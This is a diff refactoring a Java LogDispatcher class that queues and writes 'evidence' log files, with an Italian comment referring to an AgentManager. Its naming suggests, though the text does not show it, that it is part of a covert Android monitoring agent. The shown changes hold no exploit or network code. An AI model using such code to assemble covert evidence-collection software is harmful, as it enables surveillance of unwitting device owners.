@@ -27,8 +27,8 @@ import com.android.service.util.Check;
  * creation, write and close.
  */
 public class LogDispatcher extends Thread implements Runnable {
-	private static final String TAG = "LogDispatcher";
-	
+	private static final String TAG = "LogDispatcher"; //$NON-NLS-1$
+
 	/** The singleton. */
 	private volatile static LogDispatcher singleton;
 
@@ -49,6 +49,8 @@ public class LogDispatcher extends Thread implements Runnable {
 
 	/** The no logs. */
 	final Condition noLogs = lock.newCondition();
+
+	private Object emptyQueue = new Object();
 
 	/*
 	 * private BroadcastReceiver mExternalStorageReceiver; private boolean
@@ -81,7 +83,7 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private void processQueue() {
 		Packet p;
-		// if(AutoConfig.DEBUG) Check.log( TAG +
+		// if(AutoConfig.DEBUG) Check.log( TAG  ;//$NON-NLS-1$
 		// " processQueue() Packets in Queue: " + q.size());
 
 		if (queue.size() == 0) {
@@ -92,32 +94,33 @@ public class LogDispatcher extends Thread implements Runnable {
 			p = queue.take();
 		} catch (final InterruptedException e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e);//$NON-NLS-1$
 			}
 			return;
 		}
 
 		switch (p.getCommand()) {
-		case LogR.LOG_CREATE:
-			createLog(p);
-			break;
-
-		case LogR.LOG_ATOMIC:
-			atomicLog(p);
-			break;
-
-		case LogR.LOG_WRITE:
-			writeLog(p);
-			break;
-
-		case LogR.LOG_CLOSE:
-			closeLog(p);
-			break;
-
-		default:
-			if (Cfg.DEBUG)
-				Check.log( TAG + " Error: " + "processQueue() got LOG_UNKNOWN");
-			break;
+			case LogR.LOG_CREATE:
+				createLog(p);
+				break;
+	
+			case LogR.LOG_ATOMIC:
+				atomicLog(p);
+				break;
+	
+			case LogR.LOG_WRITE:
+				writeLog(p);
+				break;
+	
+			case LogR.LOG_CLOSE:
+				closeLog(p);
+				break;
+	
+			default:
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error: " + "processQueue() got LOG_UNKNOWN"); //$NON-NLS-1$ //$NON-NLS-2$
+				}
+				break;
 		}
 
 		return;
@@ -147,8 +150,9 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	@Override
 	public void run() {
-		if (Cfg.DEBUG)
-			Check.log( TAG + " LogDispatcher started");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " LogDispatcher started"); //$NON-NLS-1$
+		}
 
 		// Create log directory
 		sdDir = new File(Path.logs());
@@ -161,7 +165,13 @@ public class LogDispatcher extends Thread implements Runnable {
 			lock.lock();
 
 			try {
-				while (queue.size() == 0 && !halt) {
+				while (queue.isEmpty() && !halt) {
+					synchronized (emptyQueue) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (run): notify empty queue");
+						}
+						emptyQueue.notifyAll();
+					}
 					noLogs.await();
 				}
 
@@ -169,15 +179,18 @@ public class LogDispatcher extends Thread implements Runnable {
 				if (halt == true) {
 					queue.clear();
 					evidences.clear();
-					if (Cfg.DEBUG)
-						Check.log( TAG + " LogDispatcher closing");
+					
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " LogDispatcher closing"); //$NON-NLS-1$
+					}
+					
 					return;
 				}
 
 				processQueue();
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
-					Check.log(e);
+					Check.log(e);//$NON-NLS-1$
 				}
 			} finally {
 				lock.unlock();
@@ -204,7 +217,7 @@ public class LogDispatcher extends Thread implements Runnable {
 			}
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);
+				Check.log(e);//$NON-NLS-1$
 			}
 		} finally {
 			lock.unlock();
@@ -235,11 +248,13 @@ public class LogDispatcher extends Thread implements Runnable {
 	 * @return true, if successful
 	 */
 	private boolean createLog(final Packet p) {
-		if(Cfg.DEBUG) Check.ensures(!evidences.containsKey(p.getId()),
-				"evidence already mapped");
+		if (Cfg.DEBUG) {
+			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped"); //$NON-NLS-1$
+		}
 
 		final byte[] additional = p.getAdditional();
 		final Evidence evidence = new Evidence(p.getType());
+		
 		if (evidence.createEvidence(additional)) {
 			evidences.put(p.getId(), evidence);
 		}
@@ -255,8 +270,9 @@ public class LogDispatcher extends Thread implements Runnable {
 	 *            the p
 	 */
 	private void atomicLog(final Packet p) {
-		if(Cfg.DEBUG) Check.ensures(!evidences.containsKey(p.getId()),
-				"evidence already mapped");
+		if (Cfg.DEBUG) {
+			Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped"); //$NON-NLS-1$
+		}
 
 		final byte[] additional = p.getAdditional();
 		final byte[] data = p.peek();
@@ -276,8 +292,10 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private boolean writeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
-			if (Cfg.DEBUG)
-				Check.log( TAG + " Requested log not found");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Requested log not found"); //$NON-NLS-1$
+			}
+			
 			return false;
 		}
 
@@ -296,16 +314,51 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private boolean closeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
-			if (Cfg.DEBUG)
-				Check.log( TAG + " Requested log not found");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Requested log not found"); //$NON-NLS-1$
+			}
 			return false;
 		}
 
 		// Rename .tmp to .log
 		final Evidence evidence = evidences.get(p.getId());
-		evidence.close();
+		
+		if (evidence != null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (closeLog): " + evidence);
+			}
+			
+			evidence.close();
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " ERROR (closeLog): evidence==null");
+			}
+		}
 
 		return true;
+	}
+
+	/**
+	 * da chiamare solo dopo aver chiamato la AgentManager.stopAll()
+	 */
+	public void waitOnEmptyQueue() {
+		try {
+			synchronized (emptyQueue) {
+				if (queue.isEmpty()) {
+					return;
+				}
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (waitOnEmptyQueue)");
+				}
+				emptyQueue.wait();
+			}
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				ex.printStackTrace();
+				Check.log(TAG + " ERROR (waitOnEmptyQueue): " + ex);
+			}
+		} 
 	}
 
 	/*
